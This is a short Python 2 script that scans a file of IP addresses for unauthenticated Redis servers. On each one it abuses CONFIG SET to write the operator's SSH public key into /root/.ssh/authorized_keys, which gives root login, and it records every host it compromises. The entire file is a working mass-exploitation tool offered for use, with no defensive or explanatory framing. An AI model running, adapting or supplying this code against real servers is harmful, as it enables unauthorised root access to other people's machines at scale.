#!/usr/bin/python

from telnetlib import Telnet
import sys

global iplist
iplist = []
global result
crackresult = open("crackresult", "w+")

def read_iplist_file(file):
    f = open(file, "r")
    while True:
        line = f.readline()
        if len(line) == 0:
            break
        iplist.append(line[:-1])
    f.close()

def crack_redis_server(ip, rsapubstr):
    print "start crack %s\n" % ip

    tn = Telnet(ip, 6379, timeout=5)

    tn.write("ping\n")
    result = tn.read_some()
    print result
    if result != "+PONG\r\n":
        return

    tn.write("config set dir /root/.ssh/\n")
    result = tn.read_some()
    print result
    if result != "+OK\r\n":
        return

    tn.write("config set dbfilename authorized_keys\n")
    result = tn.read_some()
    print result
    if result != "+OK\r\n":
        return

    tn.write('set xxxx "\\n\\n\\n%s\\n\\n\\n"\n' % rsapubstr)
    result = tn.read_some()
    print result
    if result != "+OK\r\n":
        return

    tn.write("save\n")
    result = tn.read_some()
    print result
    if result != "+OK\r\n":
        return

    print "crack %s success\n" % ip
    crackresult.write("%s\n" % ip)
    crackresult.flush()

if len(sys.argv) != 2:
    sys.stdout.write("Usage: %s iplistfile\n" % sys.argv[0])
    sys.exit(1)


read_iplist_file(sys.argv[1])

rsapub = open("/root/.ssh/id_rsa.pub", "r")
rsapubstr = rsapub.readline()
print rsapubstr
rsapub.close()

for ip in iplist:
    try:
        crack_redis_server(ip, rsapubstr[:-1])
    except:
        continue
crackresult.close()

